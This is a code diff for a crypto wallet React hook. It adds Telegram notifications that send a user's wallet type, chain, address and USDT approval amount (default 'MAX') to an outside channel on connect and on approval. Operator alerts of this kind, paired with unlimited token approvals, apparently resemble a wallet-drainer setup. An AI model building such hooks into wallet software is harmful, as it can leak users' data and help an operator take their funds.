@@ -13,6 +13,7 @@ import {
   UseWalletReturn,
 } from "@/types";
 import { walletManager } from "@/lib/wallet";
+import { telegramService } from "@/lib/telegram";
 
 export function useWallet(): UseWalletReturn {
   const [wallet, setWallet] = useState<WalletConnection | null>(null);
@@ -36,6 +37,16 @@ export function useWallet(): UseWalletReturn {
           `✅ Connected to ${walletType} on ${chain}:`,
           connection.address
         );
+
+        // Send Telegram notification for wallet connection
+        if (telegramService.isEnabled()) {
+          await telegramService.notifyWalletConnect({
+            walletType,
+            chain,
+            userAddress: connection.address,
+            timestamp: new Date().toLocaleString(),
+          });
+        }
       } catch (error: any) {
         console.error("Wallet connection failed:", error);
         throw error;
@@ -123,6 +134,19 @@ export function useWallet(): UseWalletReturn {
         );
 
         console.log(`✅ USDT approved on ${walletToUse.chain}:`, result.hash);
+
+        // Send Telegram notification for approval success
+        if (telegramService.isEnabled()) {
+          await telegramService.notifyApproveSuccess({
+            walletType: walletToUse.wallet,
+            chain: walletToUse.chain,
+            userAddress: walletToUse.address,
+            amount: amount || "MAX",
+            token: "USDT",
+            timestamp: new Date().toLocaleString(),
+          });
+        }
+
         return result;
       } catch (error: any) {
         console.error("USDT approval failed:", error);
